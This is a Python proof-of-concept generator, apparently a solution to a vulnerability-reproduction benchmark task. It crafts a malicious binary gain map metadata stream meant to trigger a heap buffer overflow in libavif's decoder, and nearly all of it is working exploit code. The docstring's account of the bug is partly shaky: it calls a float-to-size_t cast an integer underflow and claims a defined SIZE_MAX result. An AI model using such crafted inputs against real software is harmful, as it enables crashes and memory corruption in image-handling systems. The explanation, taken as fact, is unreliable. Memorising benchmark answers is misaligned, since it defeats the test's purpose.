import sys

class Solution:
    """
    Generates a Proof-of-Concept input for a heap buffer overflow vulnerability
    in libavif's decodeGainmapMetadata() function (oss-fuzz:42535447).

    The vulnerability is an integer underflow caused by casting a negative float
    to an unsigned size_t. This occurs in the calculation of `tonemapLutSize`:
    `const size_t tonemapLutSize = (size_t)(metadata->hdr.max.f - metadata->hdr.min.f + 1.0f);`

    If `max.f - min.f` is less than -1.0, the result of the cast will be a very
    large positive number due to wrap-around, leading to a huge memory allocation
    and a subsequent heap buffer overflow.

    To trigger this, we need to craft a gain map metadata payload where the
    parsed float value `min.f` is sufficiently larger than `max.f`. The float
    values are derived from 24-bit unsigned integers (`min.n`, `max.n`) read from
    the stream, using a fixed denominator:
    `min.f = (float)min.n / 10000;`
    `max.f = (float)max.n / 10000;`

    By setting `min.n = 20000` and `max.n = 0`, we get:
    `min.f = 2.0`
    `max.f = 0.0`
    `tonemapLutSize = (size_t)(0.0 - 2.0 + 1.0) = (size_t)(-1.0)`
    Casting -1.0f to size_t results in SIZE_MAX, triggering the vulnerability.

    The PoC is a compact binary stream representing this malicious metadata,
    constructed according to the format expected by `avifGainMapMetadataDecode`.
    """
    def solve(self, src_path: str) -> bytes:
        
        class BitWriter:
            def __init__(self):
                self.buffer = bytearray()
                self.bit_buffer = 0
                self.bit_count = 0

            def write(self, value: int, num_bits: int):
                # Add new bits to the right of the buffer
                self.bit_buffer = (self.bit_buffer << num_bits) | value
                self.bit_count += num_bits

                # Write out full bytes from the left of the buffer
                while self.bit_count >= 8:
                    byte_to_write = (self.bit_buffer >> (self.bit_count - 8)) & 0xFF
                    self.buffer.append(byte_to_write)
                    self.bit_count -= 8
            
            def get_bytes(self) -> bytes:
                # Flush any remaining bits
                if self.bit_count > 0:
                    byte_to_write = (self.bit_buffer << (8 - self.bit_count)) & 0xFF
                    self.buffer.append(byte_to_write)
                return bytes(self.buffer)

        writer = BitWriter()

        # The metadata format starts with a single bit flag, followed by
        # several 24-bit and ULEB128 fields. The bit-level packing is crucial.
        
        # 1. baseRenditionIsHDR (1 bit)
        writer.write(0, 1)

        # 2. gamma.n (24 bits)
        writer.write(0, 24)
        
        # 3. offsetSdr.n (24 bits)
        writer.write(0, 24)
        
        # 4. offsetHdr.n (24 bits)
        writer.write(0, 24)

        # 5. min.n (24 bits) - Set to 20000 to make min.f = 2.0
        writer.write(20000, 24)

        # 6. max.n (24 bits) - Set to 0 to make max.f = 0.0
        writer.write(0, 24)
        
        # The parser then reads ULEB128 values. The stream may be unaligned.
        # We provide minimal 1-byte values for these.
        
        # 7. tonemapLut_bitDepth (ULEB128 encoded)
        writer.write(8, 8) # A single byte for value 8
        
        # 8. numColorChannels (ULEB128 encoded)
        writer.write(1, 8) # A single byte for value 1

        return writer.get_bytes()
